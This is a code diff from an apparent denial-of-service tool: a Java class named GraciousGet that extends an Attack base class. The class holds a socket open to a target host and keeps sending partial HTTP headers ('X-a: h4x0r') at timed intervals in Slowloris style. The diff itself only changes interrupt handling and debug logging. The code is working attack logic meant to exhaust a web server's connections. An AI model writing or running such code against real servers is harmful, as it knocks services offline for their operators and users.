@@ -29,7 +29,6 @@ public class GraciousGet extends Attack {
 			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));
 			log.info("Attack thread started");
 			while(isRunning && !isInterrupted()) {
-				log.debug("Is this thread interrupted? " + isInterrupted());
 				writer.write("GET / HTTP/1.1\r\n");
 				writer.write("Host: " + hostname + " \r\n");
 				writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
@@ -41,15 +40,13 @@ public class GraciousGet extends Attack {
 					writer.write("X-a: h4x0r|h4x0r|h4x0r|h4x0r\r\n");
 					writer.flush();
 					log.debug("Writing data to socket...");
-					try {
-						log.debug("Checking for interrupt and socket closure...");
-						if (!isInterrupted() && !socket.isClosed()) {
-							log.debug("Sleeping thread...");
-							Thread.sleep(interval);
-						} else {
-							break;
-						}
-					} catch (InterruptedException e) { }
+					try {						
+						log.debug("Sleeping thread...");
+						Thread.sleep(interval);						
+					} catch (InterruptedException e) { 
+						log.debug("Interupped!");
+						stop();
+					}
 				}
 			}
 		} catch (UnknownHostException e) {
